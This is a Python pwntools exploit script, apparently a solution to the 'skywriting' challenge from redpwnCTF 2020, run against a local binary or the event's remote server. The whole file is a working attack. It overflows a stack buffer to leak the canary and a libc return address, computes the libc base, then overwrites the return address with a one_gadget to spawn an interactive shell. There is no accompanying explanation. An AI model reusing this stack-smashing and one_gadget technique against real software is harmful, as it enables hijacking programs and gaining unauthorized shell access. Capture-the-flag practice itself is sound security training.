from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "../bin/skywriting"
HOST = "2020.redpwnc.tf"
PORT = 31034

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

libc = ELF('../libc.so.6')
#libc_binsh = next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
off_main_ret = 0x21b97

def exploit():
	notflag = "notflag{a_cloud_is_just_someone_elses_computer}\n\x00"
	
	conn.sendlineafter("sky? \n", "1")	
	# canary leak
	payload = "A"*0x88
	payload += "B"
	conn.sendafter("shot: ", payload)	
	conn.recvuntil("AB")
	canary = "\x00" + conn.recv(7)
	
	# libc leak
	payload = "A"*0x97
	payload += "B"
	conn.sendafter("shot: ", payload)	
	conn.recvuntil("AB")
	libc_main_ret = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_main_ret - off_main_ret
	one_gadget = libc_base + gadget[0]
	print hex(libc_base)
	
	# set canary and one_gadget
	payload = "\x00"*0x88
	payload += canary
	payload += "\x00"*8
	payload += p64(one_gadget)
	conn.sendafter("shot: ", payload)	
	conn.sendlineafter("shot: ", notflag)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
